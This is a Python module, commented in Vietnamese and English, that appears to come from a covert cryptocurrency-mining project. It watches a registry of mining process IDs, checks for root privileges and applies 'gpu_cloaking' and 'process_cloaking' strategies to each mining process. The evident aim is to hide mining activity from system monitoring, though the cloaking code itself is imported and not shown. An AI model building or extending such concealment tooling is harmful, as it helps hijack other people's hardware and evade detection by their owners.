"""
**Resource Manager Module** (module quản lý tài nguyên - điều phối và tối ưu hóa GPU resources)

**GPU Resource Management System** (hệ thống quản lý tài nguyên GPU) với **cloaking-only architecture** (kiến trúc chỉ che giấu).
"""

import logging
import psutil
import pynvml
import traceback
import threading
import concurrent.futures
import queue
import time
from threading import RLock
from typing import List, Any, Dict, Optional
from pathlib import Path

# **Core Project Imports** (imports dự án cốt lõi)
from mining_environment.scripts.utils import MiningProcess
from mining_environment.scripts.resource_control import CloakStrategyFactory
from mining_environment.scripts.auxiliary_modules.interfaces import IResourceManager
from mining_environment.scripts.auxiliary_modules.models import ConfigModel
from mining_environment.scripts.privileged_operations import get_privileged_manager
from mining_environment.scripts.unified_logging import get_unified_logger
from mining_environment.scripts.error_management import get_error_reporter
from mining_environment.scripts.strategy_cache import get_strategy_cache, CacheEvictionPolicy

# **Module Logger** (logger module)
module_logger = get_unified_logger('resource_manager')

class SharedResourceManager:
    """
    **Shared Resource Manager Class** (lớp quản lý tài nguyên chia sẻ)
    
    **Core GPU resource management** (quản lý tài nguyên GPU cốt lõi):
    - NVML Lifecycle Management
    - GPU Usage Monitoring  
    - Cloaking Strategy Application
    """

    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        self.logger = get_unified_logger('resource_manager')
        self.config = config
        self.resource_managers = resource_managers
        
        # **Strategy Cache** (bộ đệm chiến lược)
        self.strategy_cache = get_strategy_cache(
            max_size=500,
            ttl_seconds=7200.0,
            eviction_policy=CacheEvictionPolicy.INTELLIGENT
        )
        
        # **Privileged Operations** (thao tác đặc quyền)
        self.privileged_manager = get_privileged_manager(logger)
        
        # **Security Context** (ngữ cảnh bảo mật)
        security_context = self.privileged_manager.validate_security_context()
        self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")

        self._nvml_init = False
        try:
            self.initialize_nvml()
            self.logger.info("SharedResourceManager khởi tạo thành công")
        except Exception as e:
            self.logger.error(f"SharedResourceManager khởi tạo thất bại: {e}")
            raise

    def is_nvml_initialized(self) -> bool:
        return self._nvml_init

    def initialize_nvml(self):
        """**Thread-Safe NVML Initialization** (khởi tạo NVML an toàn luồng)"""
        if self._nvml_init:
            return

        try:
            def nvml_init_worker():
                pynvml.nvmlInit()
                return True

            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
                future = executor.submit(nvml_init_worker)
                try:
                    timeout = getattr(self.config, 'nvml_init_timeout', 3.0)
                    result = future.result(timeout=timeout)
                    if result:
                        self._nvml_init = True
                        self.logger.info("NVML khởi tạo thành công")
                except concurrent.futures.TimeoutError:
                    self.logger.warning("NVML khởi tạo timeout")
                    raise
        except Exception as e:
            self.logger.error(f"NVML khởi tạo thất bại: {e}")
            raise

    def shutdown_nvml(self):
        """**Safe NVML Shutdown** (tắt NVML an toàn)"""
        if self._nvml_init:
            try:
                pynvml.nvmlShutdown()
                self._nvml_init = False
                self.logger.info("NVML đã tắt")
            except Exception as e:
                self.logger.error(f"Lỗi tắt NVML: {e}")

    def get_process_cache_usage(self, pid: int) -> float:
        """**Get Process Cache Usage** (lấy cache usage của process)"""
        try:
            if not self._nvml_init:
                return 0.0
                
            process = psutil.Process(pid)
            memory_info = process.memory_info()
            return float(memory_info.rss) / (1024 * 1024)  # MB
        except Exception as e:
            self.logger.debug(f"Không thể lấy cache usage cho PID {pid}: {e}")
            return 0.0

    def get_gpu_usage_percent(self, pid: int) -> float:
        """**Get GPU Usage Percent** (lấy phần trăm sử dụng GPU)"""
        return self._sync_get_gpu_usage_percent(pid)

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        """**Synchronous GPU Usage Check** (kiểm tra sử dụng GPU đồng bộ)"""
        try:
            if not self._nvml_init:
                return 0.0

            device_count = pynvml.nvmlDeviceGetCount()
            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                processes = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                
                for proc in processes:
                    if proc.pid == pid:
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        return float(utilization.gpu)
            return 0.0
        except Exception as e:
            self.logger.debug(f"Không thể lấy GPU usage cho PID {pid}: {e}")
            return 0.0

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """**Apply Cloaking Strategy** (áp dụng chiến lược che giấu)"""
        try:
            strategy_factory = CloakStrategyFactory(self.config)
            strategy = strategy_factory.create_strategy(strategy_name)
            
            if strategy:
                result = strategy.apply(process)
                if result:
                    self.logger.info(f"Áp dụng chiến lược {strategy_name} thành công cho PID {process.pid}")
                    return True
                else:
                    self.logger.warning(f"Áp dụng chiến lược {strategy_name} thất bại cho PID {process.pid}")
                    return False
            else:
                self.logger.error(f"Không thể tạo chiến lược {strategy_name}")
                return False
        except Exception as e:
            self.logger.error(f"Lỗi áp dụng chiến lược {strategy_name}: {e}")
            return False


class ResourceManager(IResourceManager):
    """
    **Main Resource Manager Class** (lớp quản lý tài nguyên chính)
    
    **Simplified Architecture** (kiến trúc đơn giản hóa):
    - DirectPIDRegistry Observer-Based Cloaking
    - No Process Discovery or Monitoring  
    - Thread-Safe Singleton Pattern
    """

    _instance = None
    _instance_lock = threading.Lock()
    _ready_event = threading.Event()
    _initialization_lock = threading.RLock()

    def __new__(cls, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        """**Singleton Creation** (tạo singleton)"""
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
                module_logger.debug("ResourceManager Singleton Created")
        return cls._instance

    def __init__(self, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        """**Initialize ResourceManager** (khởi tạo ResourceManager)"""
        if getattr(self, '_initialized', False):
            module_logger.debug("ResourceManager Singleton Already Initialized")
            return

        with self._initialization_lock:
            if getattr(self, '_initialized', False):
                return

            self.logger = get_unified_logger('resource_manager')
            self.config = self._validate_configuration(config)
            
            # **Core Components** (thành phần cốt lõi)
            self.shared_resource_manager = None
            self._stop_flag = False
            self.workers = []
            self.resource_adjustment_queue = queue.Queue()
            
            # **DirectPIDRegistry Integration** (tích hợp DirectPIDRegistry)
            self._setup_direct_registry_observer()
            
            self._initialized = True
            module_logger.info("ResourceManager khởi tạo thành công")

    @classmethod
    def wait_for_ready(cls, timeout: float = 10.0) -> bool:
        """**Wait for ResourceManager Ready** (chờ ResourceManager sẵn sàng)"""
        try:
            return cls._ready_event.wait(timeout=timeout)
        except Exception as e:
            module_logger.error(f"Lỗi chờ ResourceManager ready: {e}")
            return False

    @classmethod
    def is_ready(cls) -> bool:
        """**Check if ResourceManager is Ready** (kiểm tra ResourceManager sẵn sàng)"""
        return cls._ready_event.is_set()

    @classmethod
    def signal_ready(cls):
        """**Signal ResourceManager Ready** (báo hiệu ResourceManager sẵn sàng)"""
        cls._ready_event.set()
        module_logger.info("ResourceManager Ready Signal Set")

    @classmethod
    def clear_ready_signal(cls):
        """**Clear ResourceManager Ready Signal** (xóa tín hiệu sẵn sàng)"""
        cls._ready_event.clear()
        module_logger.info("ResourceManager Ready Signal Cleared")

    def _validate_configuration(self, config: ConfigModel) -> ConfigModel:
        """**Validate Configuration** (xác thực cấu hình)"""
        if not config:
            raise ValueError("Configuration không được None")
        
        # **Cloaking Strategies Validation** (xác thực chiến lược che giấu)
        if not hasattr(config, 'cloaking_strategies') or not config.cloaking_strategies:
            self.logger.warning("Không có cloaking strategies, sử dụng mặc định")
            
        return config

    def is_gpu_initialized(self) -> bool:
        """**Check GPU Initialization** (kiểm tra khởi tạo GPU)"""
        return self.shared_resource_manager and self.shared_resource_manager.is_nvml_initialized()

    def handle_resource_adjustment(self, event_data: Dict[str, Any]):
        """**Handle Resource Adjustment** (xử lý điều chỉnh tài nguyên)"""
        try:
            self.resource_adjustment_queue.put(event_data, block=False)
        except queue.Full:
            self.logger.warning("Resource adjustment queue đầy")

    def _setup_direct_registry_observer(self):
        """**Setup DirectPIDRegistry Observer** (thiết lập observer DirectPIDRegistry)"""
        try:
            from mining_environment.scripts.direct_pid_registry import DirectPIDRegistry
            
            registry = DirectPIDRegistry.get_instance()
            registry.register_observer('resource_manager', self._on_process_registered_direct)
            self.logger.info("DirectPIDRegistry observer đã đăng ký")
        except Exception as e:
            self.logger.error(f"Lỗi thiết lập DirectPIDRegistry observer: {e}")

    def _on_process_registered_direct(self, process_info) -> None:
        """**Handle Process Registration** (xử lý đăng ký process)"""
        try:
            pid = process_info.get('pid')
            if not pid:
                return

            # **Create MiningProcess** (tạo MiningProcess)
            mining_process = MiningProcess(
                pid=pid,
                name=process_info.get('name', f'process_{pid}'),
                cmd=process_info.get('cmd', [])
            )

            # **Trigger Cloaking** (kích hoạt che giấu)
            self.trigger_cloaking(mining_process, 'direct_registry')
            
        except Exception as e:
            self.logger.error(f"Lỗi xử lý process registration: {e}")

    def trigger_cloaking(self, process: MiningProcess, source: str):
        """**Trigger Cloaking for Process** (kích hoạt che giấu cho process)"""
        try:
            if not self.shared_resource_manager:
                self.logger.warning("SharedResourceManager chưa khởi tạo")
                return

            # **Determine Strategies** (xác định chiến lược)
            strategies = self._determine_strategies(process)
            
            # **Apply Strategies** (áp dụng chiến lược)
            for strategy_name in strategies:
                success = self.shared_resource_manager.apply_cloak_strategy(strategy_name, process)
                if success:
                    self.logger.info(f"Cloaking thành công: {strategy_name} cho PID {process.pid}")
                else:
                    self.logger.warning(f"Cloaking thất bại: {strategy_name} cho PID {process.pid}")
                    
        except Exception as e:
            self.logger.error(f"Lỗi trigger cloaking cho PID {process.pid}: {e}")

    def _determine_strategies(self, process: MiningProcess) -> List[str]:
        """**Determine Cloaking Strategies** (xác định chiến lược che giấu)"""
        strategies = []
        
        try:
            # **Default Strategies** (chiến lược mặc định)
            if hasattr(self.config, 'cloaking_strategies'):
                strategies.extend(self.config.cloaking_strategies)
            else:
                strategies = ['gpu_cloaking', 'process_cloaking']
                
            # **Filter Available Strategies** (lọc chiến lược có sẵn)
            available_strategies = [s for s in strategies if self._is_strategy_available(s)]
            
            return available_strategies
            
        except Exception as e:
            self.logger.error(f"Lỗi xác định strategies: {e}")
            return ['gpu_cloaking']  # fallback

    def _is_strategy_available(self, strategy_name: str) -> bool:
        """**Check Strategy Availability** (kiểm tra tính khả dụng của chiến lược)"""
        try:
            strategy_factory = CloakStrategyFactory(self.config)
            strategy = strategy_factory.create_strategy(strategy_name)
            return strategy is not None
        except Exception:
            return False

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """**Collect Process Metrics** (thu thập metrics của process)"""
        metrics = {
            'timestamp': time.time(),
            'pid': process.pid,
            'name': process.name
        }
        
        try:
            if self.shared_resource_manager:
                metrics['gpu_usage'] = self.shared_resource_manager.get_gpu_usage_percent(process.pid)
                metrics['cache_usage'] = self.shared_resource_manager.get_process_cache_usage(process.pid)
        except Exception as e:
            self.logger.debug(f"Lỗi thu thập metrics cho PID {process.pid}: {e}")
            
        return metrics

    def start(self):
        """**Start ResourceManager** (khởi động ResourceManager)"""
        try:
            self.logger.info("Khởi động ResourceManager...")
            
            # **Initialize Shared Resource Manager** (khởi tạo Shared Resource Manager)
            resource_managers = {'main': self}
            self.shared_resource_manager = SharedResourceManager(
                self.config, self.logger, resource_managers
            )
            
            # **Start Worker Threads** (khởi động worker threads)
            self._start_workers()
            
            # **DirectPIDRegistry Observer** (DirectPIDRegistry observer đã được thiết lập trong __init__)
            # Process discovery sẽ được xử lý thông qua DirectPIDRegistry callbacks
            
            # **Signal Ready** (báo hiệu sẵn sàng)
            self.signal_ready()
            
            self.logger.info("ResourceManager đã khởi động thành công")
            
        except Exception as e:
            self.logger.error(f"Lỗi khởi động ResourceManager: {e}")
            raise

    def _start_workers(self):
        """**Start Worker Threads** (khởi động worker threads)"""
        # **Start Resource Adjustment Worker** (khởi động worker điều chỉnh tài nguyên)
        worker = threading.Thread(
            target=self.process_resource_adjustments,
            name="ResourceAdjustmentWorker",
            daemon=True
        )
        worker.start()
        self.workers.append(worker)
        
        self.logger.info("Worker threads đã khởi động")


    def process_resource_adjustments(self):
        """**Process Resource Adjustments** (xử lý điều chỉnh tài nguyên)"""
        while not self._stop_flag:
            try:
                event_data = self.resource_adjustment_queue.get(timeout=1.0)
                
                # **Process Adjustment** (xử lý điều chỉnh)
                self.logger.debug(f"Xử lý resource adjustment: {event_data}")
                
                self.resource_adjustment_queue.task_done()
                
            except queue.Empty:
                continue
            except Exception as e:
                self.logger.error(f"Lỗi xử lý resource adjustment: {e}")


    def shutdown(self):
        """**Shutdown ResourceManager** (tắt ResourceManager)"""
        self.logger.info("Tắt ResourceManager...")
        
        # **Clear Ready Signal** (xóa tín hiệu sẵn sàng)
        self.clear_ready_signal()

        # **Wait for Queue** (chờ queue)
        try:
            self.resource_adjustment_queue.join()
        except Exception as e:
            self.logger.error(f"Lỗi chờ queue: {e}")

        # **Set Stop Flag** (đặt cờ dừng)
        self._stop_flag = True

        # **Wait for Workers** (chờ workers)
        for worker in self.workers:
            try:
                worker.join(timeout=5.0)
                if worker.is_alive():
                    self.logger.warning(f"Worker {worker.name} vẫn đang chạy")
            except Exception as e:
                self.logger.error(f"Lỗi join worker {worker.name}: {e}")

        # **Shutdown NVML** (tắt NVML)
        if self.shared_resource_manager:
            try:
                self.shared_resource_manager.shutdown_nvml()
            except Exception as e:
                self.logger.error(f"Lỗi tắt NVML: {e}")

        self.logger.info("ResourceManager đã tắt")

    def stop(self):
        """**Stop ResourceManager** (dừng ResourceManager) - Interface implementation"""
        self.shutdown()